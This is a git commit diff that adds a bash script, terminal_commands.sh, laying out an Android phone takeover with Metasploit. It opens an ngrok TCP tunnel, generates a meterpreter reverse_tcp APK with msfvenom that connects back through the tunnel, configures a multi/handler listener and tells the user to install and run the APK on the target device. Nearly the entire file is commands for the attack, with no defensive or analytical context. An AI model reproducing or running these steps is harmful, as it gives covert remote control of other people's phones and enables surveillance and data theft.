8de247bd2add8c0355f860d47414aad4adeb01d5
zakiarani75 <154520660+zakiarani75@users.noreply.github.com>
2026-05-13 12:55:06 +0500

    Update terminal_commands.sh

--- terminal_commands.sh
+++ terminal_commands.sh
@@ -1,1 +1,23 @@
+#!/bin/bash
+
+# --- STEP 1: Setting up Network Tunneling ---
+# Creating a public endpoint using Ngrok
+ngrok tcp 80
+
+# --- STEP 2: Creating the Android Payload ---
+# Generating a custom APK with Reverse TCP
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=XXXXX R > test.apk
+
+# --- STEP 3: Setting up Metasploit Listener ---
+# Configuring the multi-handler to capture the session
+msfconsole
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 80
+exploit
+
+# --- STEP 4: Deployment on Android Device ---
+# Transfer and execute test.apk on the target Android device
+# Monitor connection status in terminal
 
